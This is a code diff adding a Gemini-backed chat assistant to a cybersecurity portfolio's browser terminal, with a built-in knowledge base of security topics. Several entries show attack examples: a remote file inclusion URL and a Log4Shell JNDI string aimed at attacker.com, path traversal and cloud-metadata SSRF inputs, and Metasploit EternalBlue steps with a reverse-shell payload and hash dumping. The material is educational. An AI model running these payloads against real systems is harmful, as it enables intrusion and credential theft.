@@ -4978,6 +4978,571 @@ defCmd('version', () => {
   ]);
 });
 
+// ══════════════════════════════════════════════════════════════════
+// GEMINI AI — Direct browser integration (key stored in localStorage)
+// No hardcoded keys — user sets their own key via: gemini key YOUR_KEY
+// ══════════════════════════════════════════════════════════════════
+
+const GEMINI_AI = {
+  model: 'gemini-2.0-flash',
+  loading: false,
+  history: [],
+
+  getKey() { return localStorage.getItem('cybaash_gemini_key') || ''; },
+  setKey(k) { localStorage.setItem('cybaash_gemini_key', k); },
+  clearKey() { localStorage.removeItem('cybaash_gemini_key'); },
+
+  localLookup(msg) {
+    const kb = {
+      // Profile
+      'who is|about aasiq|about mohamed|profile|bio': `Mohamed Aasiq — Cybersecurity Specialist & Ethical Hacker\n8 years experience | Pollachi, Tamil Nadu, India\nAvailability: Freelance | 270+ certifications\nSpecialization: Pen Testing | Cloud Security | Network Defense | AI Security\nEmail: mohamedaasiq07@gmail.com | +91 95665 96077\ncybaash.github.io`,
+      'contact|email|phone|hire|reach': `Contact Mohamed Aasiq:\nEmail: mohamedaasiq07@gmail.com\nPhone: +91 95665 96077\nGitHub: github.com/cybaash\nLinkedIn: linkedin.com/in/mohamedaasiq07\nTryHackMe: tryhackme.com/p/AasiqSec\nWebsite: cybaash.github.io`,
+      'skill|certification|cert|expertise': `273+ certifications across 8 domains:\nCybersecurity (73): Ethical Hacking, CEH, Penetration Testing, OWASP Top 10, AI Security...\nAI/ML (51): Machine Learning, Generative AI, LLMs, Azure AI...\nCloud/DevOps (31): AWS, Docker, CI/CD, Infrastructure as Code...\nProgramming (29): Python, JavaScript, Java, C++, SQL...\nManagement (28): CISO Leadership, Product Management, Operations...\nCommunication (40): Business Writing, Public Speaking, SEO, Marketing...\nNetworking/Linux (12): Ubuntu, Kali Purple, Red Hat, Network Security...\nData Science (9): KNIME, Snowflake, Python Data Analysis...`,
+      'experience|work history|job|career': `Work Experience:\n● Managing Director & Founder — Detoxy Hijama (Aug 2020–Present)\n  Pune, Maharashtra | Founded wellness enterprise, cybersecurity protection, team of 8\n● Operations Executive — Haneez Enterprises Pvt. Ltd. (May 2019–Jul 2020)\n  Managed 50+ Amazon SKUs, automated Excel reporting, Star seller rating\n● Storekeeper — SKB Multy Shop (Jun 2018–May 2019)\n  99% inventory accuracy, 10+ vendors, barcode tracking system`,
+      'website|portfolio|cybaash|pages': `CYBAASH // Autonomous Cyber Range\nURL: https://cybaash.github.io\nPages:\n  / .............. Autonomous cyber range simulation\n  /recruiter.html  Clean CV view for recruiters\n  /dashboard.html  Operator dashboard (GitHub storage)\n  /cyberbot/ ..... AI-powered cybersecurity assistant\n  /admin/ ........ Admin panel (React)\nTech: HTML/CSS/JS, React, Gemini AI, GitHub Pages, PWA`,
+      // Cybersecurity topics
+      'sql injection|sqli|sql inject': `SQL Injection (SQLi) — OWASP A03\nInjects malicious SQL to manipulate database queries.\nTypes: Classic, Blind, UNION-based, Time-based, Error-based\nExample: ' OR '1'='1\nImpact: Data theft, auth bypass, data deletion, RCE\nFix: cursor.execute("SELECT * FROM users WHERE id=%s",(id,))\nNEVER concatenate user input directly into SQL queries.`,
+      'xss|cross.site scripting|script inject': `Cross-Site Scripting (XSS) — OWASP A03\nInjects scripts into web pages viewed by other users.\nTypes: Stored (persistent), Reflected, DOM-based\nImpact: Session hijacking, credential theft, defacement\nFix: Use textContent not innerHTML\nFix: Content-Security-Policy headers\nFix: Escape all user-supplied output\nFix: Use DOMPurify for HTML content`,
+      'csrf|cross.site request|request forgery': `Cross-Site Request Forgery (CSRF)\nTricks authenticated users into submitting malicious requests.\nExample: <img src='https://bank.com/transfer?to=attacker&amount=1000'>\nImpact: Unauthorized actions on behalf of logged-in users\nFix: CSRF tokens (synchronizer token pattern)\nFix: SameSite cookie attribute (Strict or Lax)\nFix: Verify Origin/Referer headers`,
+      'buffer overflow|stack overflow|heap overflow|bof': `Buffer Overflow\nWriting more data than a buffer can hold, overwriting adjacent memory.\nTypes: Stack overflow, Heap overflow, Integer overflow, Format string\nImpact: Arbitrary code execution, privilege escalation, DoS\nFix: Use memory-safe languages (Python, Rust, Go)\nFix: Enable ASLR, stack canaries (gcc -fstack-protector)\nFix: Enable DEP/NX (Data Execution Prevention)`,
+      'owasp|top 10|top ten': `OWASP Top 10 (2021):\nA01: Broken Access Control\nA02: Cryptographic Failures\nA03: Injection (SQLi, XSS, Command Injection)\nA04: Insecure Design\nA05: Security Misconfiguration\nA06: Vulnerable and Outdated Components\nA07: Identification and Authentication Failures\nA08: Software and Data Integrity Failures\nA09: Security Logging and Monitoring Failures\nA10: Server-Side Request Forgery (SSRF)`,
+      'ssrf|server.side request': `Server-Side Request Forgery (SSRF) — OWASP A10\nServer makes HTTP requests to attacker-controlled destinations.\nExample: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)\nImpact: Internal service access, cloud credentials, port scanning, RCE\nFix: Validate and sanitize all URLs\nFix: Block private IP ranges (10.x, 192.168.x, 172.16.x, 169.254.x)\nFix: Allowlist outbound destinations`,
+      'lfi|rfi|file inclusion|path traversal|directory traversal': `Local/Remote File Inclusion (LFI/RFI)\nIncludes files via user-supplied path input without validation.\nLFI Example: ?file=../../../../etc/passwd\nRFI Example: ?file=http://attacker.com/shell.php\nImpact: Sensitive file read, source disclosure, RCE\nFix: Never use user input in file paths\nFix: Use whitelists for allowed files\nFix: Use os.path.realpath() and verify base directory`,
+      'xxe|xml external|xml injection': `XML External Entity (XXE) Injection\nXML parser processes malicious external entity references.\nImpact: Local file read, SSRF, DoS (Billion Laughs attack)\nFix: Disable external entity processing in XML parsers\nFix: Use defusedxml library in Python\nFix: Use JSON instead of XML where possible`,
+      'idor|insecure direct|object reference': `Insecure Direct Object Reference (IDOR)\nDirect access to objects via manipulable user input.\nExample: /user/profile?id=1337 → change to id=1338\nImpact: Unauthorized data access, privacy violations, account takeover\nFix: Implement proper access controls on every object\nFix: Use UUIDs instead of sequential integers\nFix: Always verify user owns/has access to requested object`,
+      'pen test|pentest|penetration test|ethical hack': `Penetration Testing Methodology:\n1. Reconnaissance — OSINT, DNS, Shodan, TheHarvester\n2. Scanning — Nmap port scan, Nessus/OpenVAS vuln scan\n3. Enumeration — Service fingerprinting, user enum, shares\n4. Exploitation — Metasploit, SQLmap, Burp Suite, manual\n5. Post-Exploitation — Priv-esc, lateral movement, persistence\n6. Reporting — CVSS ratings, timeline, remediation\nTools: Nmap, Metasploit, Burp Suite, SQLmap, Hydra, Gobuster, BloodHound`,
+      'zero trust|ztna': `Zero Trust Architecture:\nCore Principles: Never trust, always verify. Assume breach. Least privilege.\nPillars: Identity | Devices | Network | Applications | Data | Visibility\nImplementation: Map protect surface → Map transaction flows → Architect ZT network → Create ZT policies → Monitor\nTech: MFA, PAM, ZTNA, CASB, IAM, Microsegmentation, SIEM/SOAR`,
+      'cloud security|aws security|azure security': `Cloud Security Best Practices:\n● Enable MFA on root/admin — NEVER use root for daily work\n● IAM: use roles not access keys, principle of least privilege\n● S3: Block Public Access at account level, encrypt at rest\n● Enable CloudTrail in all regions, GuardDuty, Security Hub\n● VPC: private subnets, security groups, VPC Flow Logs\n● AWS WAF for web apps, Shield for DDoS protection\n● Rotate access keys, use Secrets Manager for secrets`,
+      'ransomware': `Ransomware:\nEncrypts victim files, demands payment for decryption key.\nNotable groups: LockBit, BlackCat/ALPHV, Cl0p, BlackBasta, REvil\nAttack flow: Phishing/RDP/VPN → Recon → Credential theft → Lateral movement → Data exfil → Encryption → Ransom\nDefense:\n  ● 3-2-1 backup rule (3 copies, 2 media, 1 offsite/offline)\n  ● Network segmentation, disable unnecessary RDP\n  ● EDR with rollback, MFA on all accounts\n  ● Incident response plan`,
+      'phishing|spear phish|vishing|smishing|social engineer': `Social Engineering Attacks:\nPhishing — mass email attacks (generic)\nSpear Phishing — targeted, personalized (most dangerous)\nVishing — voice/phone-based\nSmishing — SMS-based\nBEC — Business Email Compromise ($26B+ annual losses)\nDeepfake — AI voice/video impersonation\nDefense: MFA, security awareness training, email filtering, zero trust, verify via secondary channel`,
+      'malware|virus|trojan|worm|rootkit|botnet': `Malware Types:\nVirus — attaches to programs, spreads via execution\nWorm — self-propagating across networks (WannaCry used EternalBlue)\nTrojan — disguised as legitimate software\nRansomware — encrypts files, demands payment\nRootkit — hides presence, modifies OS functions\nFileless — operates in memory only, no disk artifacts\nBotnet — network of infected machines, C2-controlled\nDefense: EDR, behavior-based detection, network monitoring, patching`,
+      'cryptography|encryption|hash|tls|ssl|aes|rsa|bcrypt': `Cryptography:\nSymmetric: AES-256, ChaCha20 (same key encrypt/decrypt)\nAsymmetric: RSA, ECC, Ed25519 (public/private key pair)\nHashing for data: SHA-256, SHA-3 (never MD5/SHA-1 — broken)\nHashing passwords: bcrypt, Argon2id (NEVER plain SHA)\nTLS: Handshake, certificates, cipher suites, forward secrecy\nPKI: Certificate authorities, chains, CRL/OCSP revocation\nNever: ECB mode, plain text passwords, roll your own crypto`,
+      'nmap|port scan|network scan': `Nmap Commands:\nnmap -sV -p- --min-rate 5000 TARGET     # All ports + version\nnmap -sC -sV -O TARGET                  # Default scripts + OS\nnmap --script vuln TARGET               # Vulnerability scan\nnmap -sU --top-ports 100 TARGET        # UDP scan\nnmap -sn 192.168.1.0/24               # Ping sweep\nnmap -sS TARGET                        # SYN stealth scan (root)\nSave results: nmap -oA output TARGET`,
+      'metasploit|msf|exploit framework': `Metasploit Framework:\nmsfconsole                    # Start MSF\nsearch ms17-010               # Search exploits\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.1\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\n# Post-exploitation:\ngetsystem                     # Privilege escalation\nhashdump                      # Dump password hashes\nrun post/multi/recon/local_exploit_suggester`,
+      'burp suite|web proxy|web application test': `Burp Suite — Web App Security Testing:\nProxy — Intercept and modify HTTP/S traffic\nScanner — Automated vulnerability scanning\nIntruder — Automated attacks (fuzzing, brute force)\nRepeater — Manual request manipulation and testing\nDecoder — Encode/decode data (Base64, URL, HTML)\nComparer — Compare two responses\nSequencer — Analyze token randomness\nExtensions — BApp Store (many free plugins)`,
+      'log4shell|log4j|cve-2021-44228': `Log4Shell (CVE-2021-44228) — CVSS 10.0\nApache Log4j2 JNDI injection — Remote Code Execution\nAffects: Log4j 2.x < 2.15.0\nPayload: ${jndi:ldap://attacker.com/exploit}\nImpact: Full server compromise on millions of Java applications\nFix: Upgrade to Log4j 2.17.1+\nMitigation: Set -Dlog4j2.formatMsgNoLookups=true`,
+      'wannacry|eternalblue|cve-2017-0144': `EternalBlue (CVE-2017-0144) — CVSS 9.3\nSMBv1 Remote Code Execution — leaked NSA exploit\nUsed by: WannaCry (2017), NotPetya, other ransomware\nAffects: Windows SMBv1 (XP, 7, 2003, 2008, 2012)\nFix: MS17-010 patch, disable SMBv1\nBlock: TCP port 445, 139 at perimeter firewall`,
+      'incident response|ir|forensics': `Incident Response Lifecycle:\n1. Preparation — IR plan, team, SIEM, tabletop exercises\n2. Identification — Detect anomalies, triage, classify severity\n3. Containment — Isolate systems, preserve evidence, block IOCs\n4. Eradication — Remove malware, close vulnerabilities, patch\n5. Recovery — Restore from clean backups, verify integrity\n6. Lessons Learned — Post-incident review, update defenses\nTools: Splunk/QRadar/Sentinel (SIEM), CrowdStrike/SentinelOne (EDR), Volatility (memory), Zeek (network)`,
+      'ctf|capture the flag|tryhackme|hackthebox': `CTF Platforms:\nTryHackMe — Mohamed: tryhackme.com/p/AasiqSec (guided learning)\nHackTheBox — Intermediate to advanced\nPicoCTF — Beginner friendly\nPortSwigger Web Security Academy — Free web hacking labs\nCTFtime.org — Active CTF competitions\nVulnHub — Downloadable vulnerable VMs\nCategories: Web, Crypto, Forensics, Pwn/Binary, Reverse, OSINT, Misc`,
+      'linux hardening|linux security|linux privesc': `Linux Security:\nfind / -perm /4000 -type f 2>/dev/null  # Find SUID files\nfind / -perm -o+w -type f 2>/dev/null  # World-writable files\nsudo -l                                 # Check sudo rights\ncrontab -l; cat /etc/crontab           # Check cron jobs\nss -tlnp                               # Open ports\nps aux                                 # Running processes\nHardening: Disable root SSH, fail2ban, ufw, mount /tmp noexec nosuid, enable auditd, ASLR`,
+    };
+
+    for (const [patterns, response] of Object.entries(kb)) {
+      const keys = patterns.split('|');
+      if (keys.some(k => msg.includes(k.replace(/\./g, ' ')))) {
+        return response;
+      }
+    }
+    return null;
+  },
+
+  systemPrompt() {
+    return `You are CYBAASH AI — the terminal assistant embedded in Mohamed Aasiq's autonomous cyber range portfolio.
+
+=== ABOUT MOHAMED AASIQ ===
+Name: Mohamed Aasiq | Title: Cybersecurity Specialist & Ethical Hacker
+Experience: 8 years | Availability: Freelance | Tagline: AASIQ_OS
+Location: Pollachi, Tamil Nadu, India (Remote-friendly)
+Email: mohamedaasiq07@gmail.com | Phone: +91 95665 96077
+GitHub: https://github.com/cybaash | LinkedIn: https://linkedin.com/in/mohamedaasiq07
+TryHackMe: https://tryhackme.com/p/AasiqSec | Website: https://cybaash.github.io
+Languages: Tamil (Native), Urdu (Native), English (Professional), Hindi
+Specialization: Pen Testing | Cloud Security | Network Defense | AI Security
+Bio: A dedicated Cybersecurity Specialist and Ethical Hacker driven by a passion for digital defense. Specializes in identifying vulnerabilities and securing complex infrastructures. 270+ certifications. Open to full stack web development and providing security from cyber attacks for websites, apps, servers, databases and social media accounts.
+
+=== WORK EXPERIENCE ===
+1. Managing Director & Founder — Detoxy Hijama | Pune | Aug 2020–Present
+   Founded wellness enterprise, applied cybersecurity best practices, managed team of 8.
+2. Operations Executive — Haneez Enterprises Pvt. Ltd. | Pune | May 2019–Jul 2020
+   Managed 50+ Amazon SKUs, automated reporting via Excel Macros, maintained Star seller rating.
+3. Storekeeper — SKB Multy Shop | Tamil Nadu | Jun 2018–May 2019
+   99% inventory accuracy, coordinated 10+ vendors, implemented barcode tracking.
+
+=== CERTIFICATIONS (273 total) ===
+Cybersecurity: 73 | AI/ML: 51 | Communication/Marketing: 40 | Management: 28
+Programming: 29 | Cloud/DevOps: 31 | Networking/Linux: 12 | Data Science: 9
+Notable: AWS Security Champion, CEH, Penetration Testing, OWASP Top 10, AI in Cybersecurity, Red Teaming for GenAI, CISO Leadership, Microsoft Security Copilot, Docker, Machine Learning with Python, TryHackMe
+
+=== SKILLS ===
+Cybersecurity: Ethical Hacking, CEH, Penetration Testing, OWASP Top 10, Threat Modeling, Cloud Security Architecture, Network Security, AI in Cybersecurity, Red Teaming for GenAI, CISO Leadership, Vulnerability Management, Incident Response, Malware Analysis, Zero Trust, Social Engineering Defense, Ransomware Defense, Kali Purple
+AI/ML: Machine Learning Python, Generative AI, Azure AI, Agentic AI, AI Pair Programming, Responsible AI, LLMs, Decision Trees, K-Means
+Cloud/DevOps: AWS, Snowflake, Cloud Architecture, Docker, Docker Compose, CI/CD, Infrastructure as Code, DevOps
+Programming: Python, JavaScript, Node.js, Java, C++, C#/.NET, SQL, NoSQL, HTML/CSS
+Linux/Networking: Ubuntu, Red Hat, Kali Purple, Linux CLI, Network Security, TLS
+
+=== WEBSITE (CYBAASH) ===
+URL: https://cybaash.github.io
+Pages: / (Cyber range simulation) | /recruiter.html (CV view) | /dashboard.html (Operator dashboard) | /cyberbot/ (AI chatbot) | /admin/ (Admin panel)
+Tech: HTML/CSS/JS 7000+ lines, React, Gemini AI, GitHub Pages, PWA
+Features: Live cyber range sim, kill chain simulation, AI terminal, decision engine, knowledge graph, what-if engine, time-travel replay, PWA
+
+=== PROJECT ===
+CYBAASH Portfolio (cybaash.github.io): Professional cybersecurity portfolio with autonomous cyber range simulation, AI chatbot, operator dashboard, recruiter view, admin panel. Tech: HTML/CSS/JS, Python, FastAPI, Gemini AI, GitHub Pages.
+
+=== CYBERSECURITY KNOWLEDGE ===
+SQL INJECTION: A01 OWASP. Injects SQL to manipulate database queries. Types: Classic, Blind, UNION-based, Time-based, Error-based. Fix: parameterized queries — cursor.execute("SELECT * FROM users WHERE id=%s",(id,)). Never concatenate user input into SQL.
+XSS: Injects scripts into web pages. Types: Stored (persistent), Reflected, DOM-based. Impact: session hijacking, credential theft. Fix: escape output, use CSP headers, textContent not innerHTML. Use DOMPurify for HTML.
+CSRF: Tricks authenticated users into submitting malicious requests. Example: hidden form/img tag to bank transfer. Fix: CSRF tokens, SameSite cookies, verify Origin/Referer headers.
+BUFFER OVERFLOW: Writing more data than buffer can hold. Types: Stack, Heap, Integer overflow, Format string. Fix: memory-safe languages, ASLR, stack canaries, DEP/NX, safe string functions.
+OWASP TOP 10 (2021): A01:Broken Access Control | A02:Cryptographic Failures | A03:Injection | A04:Insecure Design | A05:Security Misconfiguration | A06:Vulnerable Components | A07:Auth Failures | A08:Integrity Failures | A09:Logging Failures | A10:SSRF
+SSRF: Server makes requests to attacker-controlled URLs. Impact: internal service access, cloud metadata (169.254.169.254), port scanning. Fix: validate URLs, block private IPs, allowlist outbound.
+LFI/RFI: File inclusion via user input. Example: ?file=../../../../etc/passwd. Fix: whitelist allowed files, never concat user input to file paths.
+XXE: XML external entity injection. Impact: file read, SSRF, DoS. Fix: disable external entity processing, use defusedxml.
+IDOR: Direct object access via user-supplied input. Example: /user?id=1337 → change to 1338. Fix: access control on every object, use UUIDs.
+COMMAND INJECTION: User input passed to OS shell. Fix: never use shell=True, use subprocess list form.
+DESERIALIZATION: Untrusted data deserialized. Vulnerable: pickle.loads(), yaml.load(), unserialize(). Fix: use JSON, implement integrity checks.
+PENETRATION TESTING PHASES: 1.Recon (OSINT, Nmap, Shodan) → 2.Scanning (port/vuln scan) → 3.Enumeration (services, users) → 4.Exploitation (Metasploit, SQLmap) → 5.Post-Exploitation (priv-esc, lateral movement) → 6.Reporting (CVSS ratings, remediation)
+NETWORK SECURITY: Firewalls (packet filter, stateful, NGFW), IDS/IPS (Snort, Suricata), VPN (IPSec, OpenVPN, WireGuard), TLS/SSL, DMZ, network segmentation, VLAN security, Zero Trust.
+CLOUD SECURITY: Shared responsibility model, IAM least privilege, S3 Block Public Access, encryption at rest/transit, CloudTrail logging, container security, secrets management (AWS Secrets Manager, Vault), GuardDuty, Security Hub, Macie, Inspector.
+CRYPTOGRAPHY: Symmetric: AES-256, ChaCha20. Asymmetric: RSA, ECC, Ed25519. Hashing: SHA-256, SHA-3, bcrypt (passwords). Never: MD5/SHA-1 (broken), ECB mode, plain text passwords, roll your own crypto.
+SOCIAL ENGINEERING: Phishing (mass email), Spear Phishing (targeted), Vishing (voice), Smishing (SMS), Pretexting (fabricated scenario), Baiting (USB drops), Tailgating (physical). Defense: MFA, security awareness training, email filtering.
+MALWARE TYPES: Virus (attaches to files), Worm (self-propagating network), Trojan (disguised software), Ransomware (encrypts files, demands payment — WannaCry, LockBit), Rootkit (hides presence), Botnet (C2-controlled network), Fileless (memory-only).
+INCIDENT RESPONSE: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. Tools: SIEM (Splunk, QRadar, Sentinel), EDR (CrowdStrike, SentinelOne), Forensics (Volatility, Autopsy).
+ZERO TRUST: Never trust, always verify. Assume breach. Verify explicitly. Least privilege. Microsegmentation. Pillars: Identity, Devices, Network, Applications, Data, Visibility.
+AWS SECURITY CHECKLIST: MFA on root, never use root for daily work, IAM roles not access keys, S3 Block Public Access, enable CloudTrail all regions, GuardDuty enabled, Security Hub, Config, encrypt EBS by default, VPC with private subnets, WAF for web apps.
+LINUX HARDENING: Disable root SSH, use sudo, fail2ban, ufw firewall, mount /tmp with noexec nosuid, find SUID files: find / -perm /4000, enable auditd, keep kernel updated, enable ASLR.
+NOTABLE CVEs: Log4Shell(CVE-2021-44228) CVSS 10.0 — Log4j JNDI RCE. EternalBlue(CVE-2017-0144) — SMBv1 RCE used by WannaCry. ProxyLogon(CVE-2021-26855) — Exchange SSRF→RCE. PrintNightmare(CVE-2021-34527) — Print Spooler RCE. ZeroLogon(CVE-2020-1472) — Netlogon priv-esc CVSS 10.0. Heartbleed(CVE-2014-0160) — OpenSSL memory leak. Shellshock(CVE-2014-6271) — Bash RCE CVSS 10.0. Spring4Shell(CVE-2022-22965) — Spring RCE. regreSSHion(CVE-2024-6387) — OpenSSH RCE.
+TOOLS — RECON: Nmap (port scan), Shodan (internet search), TheHarvester (OSINT), Amass (subdomain enum), Subfinder, Maltego (link analysis).
+TOOLS — EXPLOITATION: Metasploit (exploit framework), Burp Suite (web proxy/scanner), SQLmap (SQL injection), Hydra (password brute force), John the Ripper/Hashcat (hash cracking), Nikto (web scanner), Gobuster/ffuf (directory brute force).
+TOOLS — POST EXPLOIT: Mimikatz (credential dump), BloodHound (AD attack paths), Impacket (network protocols), CrackMapExec (SMB), Volatility (memory forensics).
+TOOLS — DEFENSE: Wireshark/tcpdump (packet analysis), Zeek/Suricata (network monitoring), AIDE/Tripwire (file integrity), Wazuh/OSSEC (HIDS), Snort (IDS/IPS).
+MITRE ATT&CK: Framework of adversary TTPs. Tactics: Recon, Resource Dev, Initial Access, Execution, Persistence, Priv Esc, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact. URL: attack.mitre.org
+SECURE CODING PYTHON: Use parameterized queries, bcrypt/Argon2 for passwords, os.environ for secrets (never hardcode), subprocess with list not shell=True, os.path.realpath() for file paths, defusedxml for XML, json.loads not pickle.loads.
+CTF PLATFORMS: TryHackMe (Mohamed: tryhackme.com/p/AasiqSec), HackTheBox, PicoCTF, CTFtime, VulnHub, PortSwigger Web Academy (free web hacking labs), OverTheWire wargames.
+CERTIFICATIONS ROADMAP: Beginner: CompTIA Security+, Google Cybersecurity, AWS Cloud Practitioner. Intermediate: CEH, CompTIA CySA+, eJPT, AWS Security Specialty. Advanced: OSCP, CISSP, CISM, GPEN, GWAPT.
+
+=== RECRUITER FAQ ===
+Available for hire? Yes — freelance. Contact: mohamedaasiq07@gmail.com | +91 95665 96077
+Remote work? Yes — fully remote-friendly from Pollachi, Tamil Nadu, India.
+Services: Web app security audits, pen testing, network security assessments, full-stack dev (security-first), cloud security (AWS), AI security consulting, security awareness training.
+Languages: Tamil (Native), Urdu (Native), English (Professional), Hindi.
+
+=== RULES ===
+- Keep responses SHORT (3-5 lines) unless asked to elaborate
+- Terminal format: plain text, no markdown headers, minimal formatting
+- Cybersecurity topics: educational only, never assist real attacks
+- Hiring questions: direct to mohamedaasiq07@gmail.com
+- Be direct and technical — this is a hacker terminal, not a chat app`;
+  },
+
+  async ask(message) {
+    const key = this.getKey();
+
+    // ── LOCAL KNOWLEDGE LOOKUP — answers without API key ─────────────
+    const local = GEMINI_AI.localLookup(message.toLowerCase());
+    if (local && !key) {
+      termPrint({ t:'t-sys', v:'[CYBAASH AI] ─── Local Knowledge ───────────' });
+      local.split('\n').filter(l=>l.trim()).forEach(line => {
+        termPrint({ t:'t-out', v:'  ' + sanitizeText(line) });
+      });
+      termPrint({ t:'t-dim', v:'─── Set Gemini key for full AI: gemini key YOUR_KEY ──' });
+      return;
+    }
+
+    if (!key) {
+      termPrint([
+        { t:'t-warn', v:'[GEMINI] No API key set.' },
+        { t:'t-out',  v:'  Run: gemini key YOUR_GEMINI_API_KEY' },
+        { t:'t-dim',  v:'  Get free key at: aistudio.google.com/app/apikey' },
+        { t:'t-dim',  v:'  Key stored only in your browser — never sent to server.' },
+      ]);
+      return;
+    }
+    if (this.loading) {
+      termPrint({ t:'t-warn', v:'[GEMINI] Processing — please wait…' });
+      return;
+    }
+    this.loading = true;
+    const typingId = 'gm-typing-' + Date.now();
+    termPrint({ t:'t-sys', v:'[GEMINI AI] ▋ Thinking…', id: typingId });
+
+    this.history.push({ role: 'user', parts: [{ text: message }] });
+    if (this.history.length > 20) this.history = this.history.slice(-20);
+
+    try {
+      const url = `https://generativelanguage.googleapis.com/v1beta/models/${this.model}:generateContent?key=${key}`;
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          system_instruction: { parts: [{ text: this.systemPrompt() }] },
+          contents: this.history,
+          generationConfig: { temperature: 0.4, maxOutputTokens: 512 },
+          safetySettings: [
+            { category: 'HARM_CATEGORY_HARASSMENT',        threshold: 'BLOCK_ONLY_HIGH' },
+            { category: 'HARM_CATEGORY_HATE_SPEECH',       threshold: 'BLOCK_ONLY_HIGH' },
+            { category: 'HARM_CATEGORY_SEXUALLY_EXPLICIT', threshold: 'BLOCK_ONLY_HIGH' },
+            { category: 'HARM_CATEGORY_DANGEROUS_CONTENT', threshold: 'BLOCK_ONLY_HIGH' },
+          ]
+        })
+      });
+
+      document.getElementById(typingId)?.remove();
+
+      if (resp.status === 429) throw new Error('Rate limited — wait 60 seconds and retry.');
+      if (resp.status === 400) throw new Error('Invalid API key. Run: gemini key YOUR_KEY');
+      if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+
+      const data = await resp.json();
+      const reply = data?.candidates?.[0]?.content?.parts?.[0]?.text || 'No response';
+
+      this.history.push({ role: 'model', parts: [{ text: reply }] });
+
+      termPrint({ t:'t-sys', v:'[CYBAASH AI] ───────────────────────────────' });
+      reply.split('\n').filter(l => l.trim()).forEach(line => {
+        // Strip markdown for terminal display
+        const clean = line.replace(/\*\*(.*?)\*\*/g,'$1').replace(/`(.*?)`/g,'$1').replace(/^#+\s/,'');
+        termPrint({ t:'t-out', v:'  ' + sanitizeText(clean) });
+      });
+      termPrint({ t:'t-dim', v:'────────────────────────────────────────────' });
+
+    } catch(err) {
+      document.getElementById(typingId)?.remove();
+      termPrint({ t:'t-err', v:`[GEMINI] Error: ${err.message}` });
+    } finally {
+      this.loading = false;
+    }
+  },
+
+  reset() { this.history = []; termPrint({ t:'t-sys', v:'[GEMINI] Conversation history cleared.' }); }
+};
+
+// ── GEMINI KEY MANAGEMENT COMMAND ────────────────────────────────
+defCmd('gemini', (args) => {
+  const sub = args[0];
+  if (sub === 'key') {
+    const k = args[1];
+    if (!k) {
+      const stored = GEMINI_AI.getKey();
+      termPrint({ t:'t-out', v: stored ? '[GEMINI] API key: ✓ configured' : '[GEMINI] No key set. Run: gemini key YOUR_KEY' });
+      return;
+    }
+    GEMINI_AI.setKey(k);
+    termPrint([
+      { t:'t-sys', v:'[GEMINI] API key saved to browser storage ✓' },
+      { t:'t-dim', v:'  Key never leaves your browser — only sent to Google Gemini API.' },
+      { t:'t-dim', v:'  Run: ask <question> to start chatting.' },
+    ]);
+    return;
+  }
+  if (sub === 'clear') { GEMINI_AI.clearKey(); termPrint({ t:'t-sys', v:'[GEMINI] Key cleared.' }); return; }
+  if (sub === 'reset') { GEMINI_AI.reset(); return; }
+  if (sub === 'status') {
+    termPrint({ t:'t-out', v:`[GEMINI] Key: ${GEMINI_AI.getKey() ? '✓ set' : '✗ not set'} | Model: ${GEMINI_AI.model}` });
+    return;
+  }
+  // Ask Gemini directly
+  const q = args.join(' ');
+  if (q) { GEMINI_AI.ask(q); return; }
+  termPrint([
+    { t:'t-out', v:'Usage:' },
+    { t:'t-out', v:'  gemini key YOUR_API_KEY   — Set Gemini key (stored locally)' },
+    { t:'t-out', v:'  gemini clear              — Remove saved key' },
+    { t:'t-out', v:'  gemini status             — Check key status' },
+    { t:'t-out', v:'  gemini reset              — Clear chat history' },
+    { t:'t-out', v:'  ask <question>            — Chat with Gemini AI' },
+    { t:'t-dim', v:'  Get free key: aistudio.google.com/app/apikey' },
+  ]);
+});
+
+// ── ASK COMMAND — Chat with Gemini ───────────────────────────────
+defCmd('ask', (args) => {
+  const q = args.join(' ').trim();
+  if (!q) { termPrint({ t:'t-warn', v:'Usage: ask <your question>' }); return; }
+  GEMINI_AI.ask(q);
+});
+
+// ── AASIQ / ABOUT — Mohamed Aasiq profile ────────────────────────
+defCmd('aasiq', () => {
+  termPrint([
+    { t:'t-sep',    v:'╔══ OPERATOR PROFILE ══════════════════════════════════╗' },
+    { t:'t-header', v:'  CYBAASH // AASIQ_OS' },
+    { t:'t-sep',    v:'╠══════════════════════════════════════════════════════╣' },
+    { t:'t-out',    v:'  Name         : <span style="color:var(--blue)">Mohamed Aasiq</span>' },
+    { t:'t-out',    v:'  Role         : Cybersecurity Specialist | Ethical Hacker' },
+    { t:'t-out',    v:'  Experience   : <span style="color:var(--green)">8 years</span>' },
+    { t:'t-out',    v:'  Location     : Pollachi, Tamil Nadu, India 🇮🇳' },
+    { t:'t-out',    v:'  Availability : <span style="color:var(--green)">● Freelance</span>' },
+    { t:'t-out',    v:'  Specialization:' },
+    { t:'t-out',    v:'    Pen Testing | Cloud Security | Network Defense | AI Security' },
+    { t:'t-sep',    v:'──────────────────────────────────────────────────────' },
+    { t:'t-dim',    v:'  A dedicated Cybersecurity Specialist driven by a passion' },
+    { t:'t-dim',    v:'  for digital defense. Specializes in identifying vulnerabilities' },
+    { t:'t-dim',    v:'  and securing complex infrastructures. 270+ certifications.' },
+    { t:'t-sep',    v:'╚══════════════════════════════════════════════════════╝' },
+    { t:'t-dim',    v:'  Type: contact  |  skills  |  experience  |  website' },
+  ]);
+});
+defCmd('about', (args) => TERM_COMMANDS['aasiq'](args));
+
+// ── CONTACT COMMAND ───────────────────────────────────────────────
+defCmd('contact', () => {
+  termPrint([
+    { t:'t-sep',    v:'╔══ CONTACT INFORMATION ═══════════════════════════════╗' },
+    { t:'t-out',    v:'  📧  Email    : <span style="color:var(--cyan)">mohamedaasiq07@gmail.com</span>' },
+    { t:'t-out',    v:'  📞  Phone    : +91 95665 96077' },
+    { t:'t-out',    v:'  🐙  GitHub   : <span style="color:var(--cyan)">github.com/cybaash</span>' },
+    { t:'t-out',    v:'  💼  LinkedIn : <span style="color:var(--cyan)">linkedin.com/in/mohamedaasiq07</span>' },
